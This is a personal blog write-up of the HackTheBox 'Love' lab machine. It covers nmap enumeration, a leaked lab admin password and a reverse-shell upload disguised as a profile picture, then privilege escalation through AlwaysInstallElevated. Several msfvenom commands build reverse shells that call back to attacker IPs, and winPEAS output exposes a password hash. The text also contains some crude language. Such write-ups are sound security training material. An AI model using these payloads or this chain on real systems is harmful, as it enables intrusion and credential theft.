---
layout: post
title: "Love Writeup - HackTheBox"
category: HackTheBox
---


# HTB lab Machine - Love

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.88.15 folder that I have attached to this post.

## Enumeration summary

```
PORT     STATE SERVICE      VERSION

80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP

135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn

443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, FourOhFourRequest: 
|_    Host '10.10.16.7' is not allowed to connect to this MariaDB server

5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 21m33s, deviation: 0s, median: 21m33s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-04T18:04:37
|_  start_date: N/A

```

```
/*! AdminLTE app.js
* ================
* Main JS application file for AdminLTE v2. This file
* should be included in all pages. It controls some layout
* options and implements exclusive AdminLTE plugins.
*
* @Author  Almsaeed Studio
* @Support <https://www.almsaeedstudio.com>
* @Email   <abdullah@almsaeedstudio.com>
* @version 2.4.0
* @repository git://github.com/almasaeed2010/AdminLTE.git
* @license MIT <http://opensource.org/licenses/MIT>
*/
```

```
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /Admin/: Possible admin folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1j php/7.3.27'
|_  /includes/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1j php/7.3.27'
```

```
+ Hostname '10.129.88.15' does not match certificate's names: staging.love.htb
```

```
Summary   : Cookies[PHPSESSID], JQuery, Bootstrap, Script, PasswordField[password], X-UA-Compatible[IE=edge], HTML5, Apache[2.4.46], PHP[7.3.27], OpenSSL[1.1.1j], HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], X-Powered-By[PHP/7.3.27]
```

```
/*! jQuery v3.2.1 | (c) JS Foundation and other contributors | jquery.org/license */
```

```
/*!
|          DataTables 1.10.16
|          \xC2\xA92008-2017 SpryMedia Ltd - datatables.net/license
|         */
```

```
/*!
|          DataTables Bootstrap 3 integration
|          \xC2\xA92011-2015 SpryMedia Ltd - datatables.net/license
|         */
```

```
<!-- iCheck 1.0.1 -->
```

```
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.49' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=5/6%Time=6093F72A%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.49'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h41m34s, deviation: 4h02m34s, median: 21m31s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-06T07:25:45-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-06T14:25:46
|_  start_date: N/A

```





## Exploitation

Started off adding love to hosts:

```
10.129.88.15	love.htb	staging.love.htb
```

Which made me find this:

![image-20210504141157261](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210504141157261.png)

Easy foothold?

```
kali@kali:~/Desktop/DownloadedScripts$ msfvenom --platform Windows -p windows/x64/shell_reverse_tcp lhost=10.10.16.7 lport=1337 -f exe > shell.exe
```

PHP and EXE did not work, so I started on SQLi.

```
| http-sql-injection: 
|   Possible sqli for queries:
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=D%3bO%3dD%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.88.15:80/bower_components/jquery/dist/?C=N%3bO%3dA%27%20OR%20sqlspider
|_    http://10.129.88.15:80/bower_components/jquery/dist/?C=S%3bO%3dD%27%20OR%20sqlspider
```

But this did not bring me any further either. I went on and enummed that staging.love.htb domain a bit more.

![image-20210506105812291](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210506105812291.png)

I hate this, spent 2 days on this shit and this is how this plays out. Fuck this. Lets log in:

```
Vote Admin Creds admin: @LoveIsInTheAir!!!! 
```

![image-20210506110048528](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210506110048528.png)

Make a position, then a candidate, assign this payload to its profile picture and you got shell:

```
msfvenom -p php/reverse_php lport=1234 lhost=10.10.14.49 > dude.php
```

Upgrade shell using netcat:

![image-20210506111432710](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210506111432710.png)

Privesc time:

```
Host Name:                 LOVE
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          roy
Registered Organization:
Product ID:                00330-80112-18556-AA148
Original Install Date:     4/12/2021, 1:14:12 PM
System Boot Time:          5/6/2021, 6:11:38 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,087 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,429 MB
Virtual Memory: In Use:    2,370 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\LOVE
Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB4601554
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB4589212
                           [08]: KB5001330
                           [09]: KB5001405
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.142.18
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

I though I might wanna give juicypotato another try:

```
Download here: https://github.com/ohpe/juicy-potato/releases/tag/v0.1

Generate shell for JP to bind in:
msfvenom --platform Windows -p windows/x64/shell_reverse_tcp lhost=10.10.14.49 lport=9999 -f exe > shell.exe
```

But it did not work. Probably because I had the wrong CLSID. I went on and tested all of the CLSID's for windows 10 pro: https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_10_Pro/CLSID.list Using this batch script: https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat

Sadly none came back good. So I went on to windows exploit suggester

```
kali@kali:~/Desktop/DownloadedScripts/Windows-Exploit-Suggester$ ./windows-exploit-suggester.py --database 2021-05-06-mssb.xls --systeminfo sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 9 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits
[*] there are now 160 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 10 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical
[*]   https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Confusion Remote Code Execution
[*]   https://github.com/theori-io/chakra-2016-11
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*] 
[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*] 
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*] 
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*] 
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*] 
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*] 
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*] 
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*] 
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*] 
[*] done

```

the first four did not work. So winpeas exe time:

```
[+] LSA Protection
   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled
```

```
  [+] Credentials Guard
   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

```

```
  [+] Cached Creds
   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10
```

```
  [+] UAC Status
   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 0 - No prompting
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 0
      [*] LocalAccountTokenFilterPolicy set to 1.
      [+] Any local account can be used for lateral movement.

```

```
  [+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

```

```
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  LOVE
    DefaultUserName               :  phoebe

```

```
mysqld(5380)[c:\xampp\mysql\bin\mysqld.exe] -- POwn: Phoebe
    Permissions: Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking folder: c:\xampp\mysql\bin (Authenticated Users [WriteData/CreateFiles])
    Command Line: "c:\xampp\mysql\bin\mysqld.exe" --defaults-file="c:\xampp\mysql\bin\my.ini" --standalone
```

```
  [+] Checking Credential manager
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


     Username:              
     Password:              (Unicode Base64 encoded) RUNTMiAAAAB4oYGaY7/EY0P9oAIXponsGmwiGyj1Ek/jTwq7+RXwhUXT/f8yiEm8+b/l/BpCuSLRDUMYAbyPEG6pNLjMECIx8K9AXtx7mVgNuRsR1Gy84ssRj80SViFSALhPU+RC3Bg=
     Target:                XboxLive
     PersistenceType:       Session
     LastWriteTime:         5/6/2021 8:52:15 AM

```

```
 [+] Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    Phoebe::LOVE:1122334455667788:8681391184a7e61b53990e53acd28835:0101000000000000aff5f3499542d701cd309e8ce0a913590000000008003000300000000000000000000000002000007319df724385ce1afbd11d8b6ba83922f8b4cc3dd3ea58c076a0657f20971cab0a00100000000000000000000000000000000000090000000000000000000000
```

Used this: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated

Generate payload:

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.49 lport=4848 -f msi -o alwe.msi
```

Start listener, and root:

![image-20210506123411442](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210506123411442.png)

## Final thoughts

Initial foothold was aids, it is a fun box for windows privesc.
